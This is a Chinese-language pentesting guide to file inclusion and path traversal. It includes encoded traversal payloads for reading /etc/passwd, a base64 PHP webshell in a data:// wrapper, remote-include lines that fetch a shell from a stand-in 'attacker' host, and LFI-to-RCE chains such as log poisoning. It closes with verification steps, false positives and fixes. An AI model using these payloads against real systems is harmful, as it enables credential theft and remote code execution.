# 文件包含与路径穿越（LFI/RFI/Traversal）

> 核心问题：**用户输入进入文件路径**。包含（include）可能升级为 RCE；路径穿越可能升级为读凭据、写文件（再 RCE）。

## 一、入口

- 语言级包含：PHP `include/require`、JSP `<%@ include %>`、Node `require`、Python `importlib`
- 模板/静态资源路径：`?lang=zh`、`?template=x`、`?file=...`
- 下载/导出：`?file=report.pdf`、`?path=/data/...`
- 图片/附件代理：`/img?src=...`
- 日志/备份查看器

## 二、路径穿越绕过

```text
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd          （单次编码）
..%252f..%252f                       （双重编码，视解码层数）
....//....//etc/passwd               （"..//" 被替换为空后重组）
..%c0%af..%c0%af                     （Tomcat/Java 的非法 UTF-8 斜杠）
..%5c..%5c                           （Windows 反斜杠）
/./../../etc/passwd
/etc/passwd                          （绝对路径）
file:///etc/passwd
C:\Windows\win.ini                   （Windows）
\\attacker\share\x                  （UNC，可触发 SMB 带外/凭据泄露）
```

要点：**先数清楚解码层数**（一个 `%252f` 解两次才成 `/`），再构造对应深度。

## 三、NULL 截断与后缀绕过

- 老 PHP/Java：`../../etc/passwd%00` 截断后续固定后缀（`.php`）。
- 后缀强制：`?lang=../../etc/passwd%00.html`，或利用 `?lang=php://filter/...`。
- 大小写与多字节：宽字节 `%df%27`。

## 四、PHP 包装器与编码读源码

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   （需 allow_url_include）
zip:///uploads/evil.jpg%23shell.php
phar:///uploads/evil.jpg/shell.php                                （触发反序列化）
```

- **filter chain**：用 `convert.iconv` 链条构造任意字节写入（不需要 `allow_url_include`），是近年最常见的 LFI→RCE 手法。
- `php://input`、`expect://`（若启用）。

## 五、LFI → RCE 常见链

| 链 | 前置条件 |
|---|---|
| 包含日志 | 日志路径可读且内容可控（access log / error log），写入 `<?php ... ?>` 后包含 |
| 包含 session 文件 | session 内容可控（用户名/U-A 写入 session）→ `/tmp/sess_<id>` |
| 包含 `/proc/self/environ` | 环境变量含 U-A（需运行在 Linux 且可读） |
| 包含上传文件 | 上传"图片马"（含 PHP 代码）后包含（绕过上传后缀校验） |
| PHP filter chain | 只需 LFI，不需要上传 |
| `phar://` 反序列化 | 有可用 gadget 链 |
| 包含 `/proc/self/fd/N` | 与临时文件描述符竞争（上传竞态） |
| 包含 mail/log 文件 | `/var/log/mail`、自定义日志 |
| Win 下 `web.config`/`iis` 日志 | 类似 |

## 六、RFI

- `?page=http://attacker/shell.txt`（`allow_url_include=On`）。
- 绕过校验：`http://attacker/..%2f`、`hTtP://`、`//attacker/x`、SMB `\\attacker\x`（Windows）。
- 若只能读不能执行：作为**内容窃取/SSRF**使用。

## 七、验证（最小证据）

1. 明确参数与 payload。
2. 读文件：返回内容片段（敏感文件掩码），且路径可控唯一（如读一个只有该路径才知道的随机 marker 文件）。
3. 写文件（filter chain/日志投毒）：写入唯一标记，再通过 HTTP 读回或执行。
4. RCE：只读命令证据（`id`）或带外命中。
5. 记录受限情况（open_basedir、只读 FS、SELinux）。

## 八、常见误报

- 应用把路径参数做了白名单映射（`?lang=zh` → 映射表），看不到穿越效果。
- 返回 404/403 但被误认为"内容被过滤"。
- 声称 RCE 但没有执行证据（仅文件存在）。
- 编码变体触发了 500（解析失败≠穿越成功）。

## 九、修复

- 禁止用户输入进入文件路径；必须使用时用**映射表 + 白名单**（`id → 固定路径`）。
- 规范化路径后校验其必须位于允许的基目录内（`realpath` 前缀比较 + 禁止符号链接逃逸）。
- 禁用 `allow_url_include`/`allow_url_fopen`；禁用危险包装器（`phar`、`expect`）。
- 上传目录不可执行；日志不可被包含（放在 Web 根之外，或用不同扩展名）。

## 参考

- PortSwigger File Path Traversal、PayloadsAllTheThings File Inclusion
- php filter chain 生成器（synacktiv/php_filter_chain_generator）思路
